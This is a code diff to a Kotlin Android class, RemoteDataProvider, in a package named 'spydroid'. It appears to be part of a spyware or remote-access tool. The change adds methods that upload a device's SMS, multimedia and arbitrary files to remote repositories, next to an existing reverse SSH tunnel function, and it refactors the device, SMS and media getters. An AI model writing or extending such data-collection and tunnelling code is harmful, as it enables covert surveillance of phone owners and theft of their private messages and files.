@@ -42,6 +42,8 @@ import org.koin.core.component.inject
 import org.koin.core.context.startKoin
 import com.jcraft.jsch.JSch
 import com.jcraft.jsch.Session
+import net.spydroid.common.remote.domain.UploadFilesRepository
+import java.io.File
 import java.util.Properties
 
 private fun createReverseSSHTunnel(context: Context, port: (Int) -> Unit) {
@@ -95,11 +97,13 @@ class RemoteDataProvider private constructor(
     private val infoRepository: InfoRepository by inject()
     private val multimediaRepository: MultimediaRepository by inject()
     private val smsRepository: SmsRepository by inject()
+    private val uploadFileRepository: UploadFilesRepository by inject()
 
     private val scope = CoroutineScope(Dispatchers.IO)
 
     private val sharedPreferences: SharedPreferences =
         context.getSharedPreferences("remotePreferences", Context.MODE_PRIVATE)
+
     private object PORT_VALUES {
         val VALUE_DEFAULT = 0
         val KEY = "portTunnel"
@@ -151,6 +155,28 @@ class RemoteDataProvider private constructor(
         }
     }
 
+    fun setMultimedia(multimedia: MultimediaDevices) = apply {
+        scope.launch {
+            multimediaRepository.insertMultimedia(multimedia)
+        }
+    }
+
+    fun setSms(sms: SmsDevices) = apply {
+        scope.launch {
+            smsRepository.insertSms(sms)
+        }
+    }
+
+    fun setFile(
+        file: File,
+        type: String,
+        alias: String
+    ) = apply {
+        scope.launch {
+            uploadFileRepository.insertFile(context, file, type, alias)
+        }
+    }
+
     fun startSshTunnel() = scope.launch(Dispatchers.IO) {
         createReverseSSHTunnel(context) {
             setPort(it)
@@ -158,18 +184,8 @@ class RemoteDataProvider private constructor(
         }
     }
 
-    // GET
-    fun getAllDevices() =
-        scope.launch {
-            devicesRepository.getAllDevices().map {
-                val updateList = _devices.value.toMutableList().apply {
-                    add(it)
-                }
-                _devices.value = updateList
-            }
-        }
 
-    fun getDevice(alias: String) =
+    fun getDevice(alias: String = "ALL") =
         scope.launch {
             devicesRepository.getDevice(alias).map {
                 val updateList = _devices.value.toMutableList().apply {
@@ -179,33 +195,7 @@ class RemoteDataProvider private constructor(
             }
         }
 
-    fun getAllInfo() =
-        scope.launch {
-            infoRepository.getAllInfo().map {
-                val updateLIst = _info.value.toMutableList().apply { add(it) }
-                _info.value = updateLIst
-            }
-        }
-
-    fun getInfo(alias: String) =
-        scope.launch {
-            infoRepository.getInfo(alias).map {
-                val updateLIst = _info.value.toMutableList().apply { add(it) }
-                _info.value = updateLIst
-            }
-        }
-
-    fun getAllMultimedia() =
-        scope.launch {
-            multimediaRepository.getAllMultimedia().map {
-                val updateList = _multimedia.value.toMutableList().apply {
-                    add(it)
-                }
-                _multimedia.value = updateList
-            }
-        }
-
-    fun getMultimedia(alias: String) =
+    fun getMultimedia(alias: String = "ALL") =
         scope.launch {
             multimediaRepository.getMultimedia(alias).map {
                 val updateList = _multimedia.value.toMutableList().apply {
@@ -215,17 +205,7 @@ class RemoteDataProvider private constructor(
             }
         }
 
-    fun getAllSms() =
-        scope.launch {
-            smsRepository.getAllSms().map {
-                val updateList = _sms.value.toMutableList().apply {
-                    add(it)
-                }
-                _sms.value = updateList
-            }
-        }
-
-    fun getSms(alias: String) =
+    fun getSms(alias: String = "ALL") =
         scope.launch {
             smsRepository.getSms(alias).map {
                 val updateList = _sms.value.toMutableList().apply {
@@ -234,28 +214,6 @@ class RemoteDataProvider private constructor(
                 _sms.value = updateList
             }
         }
-
-
-    fun insertDevice(device: Devices) =
-        scope.launch {
-            devicesRepository.insertDevice(device)
-        }
-
-    fun insertInfo(info: InfoDevices) =
-        scope.launch {
-            infoRepository.insertInfo(info)
-        }
-
-    fun insertMultimedia(multimedia: MultimediaDevices) =
-        scope.launch {
-            multimediaRepository.insertMultimedia(multimedia)
-        }
-
-    fun insertSms(sms: SmsDevices) =
-        scope.launch {
-            smsRepository.insertSms(sms)
-        }
-
 
     companion object {
         @SuppressLint("StaticFieldLeak")
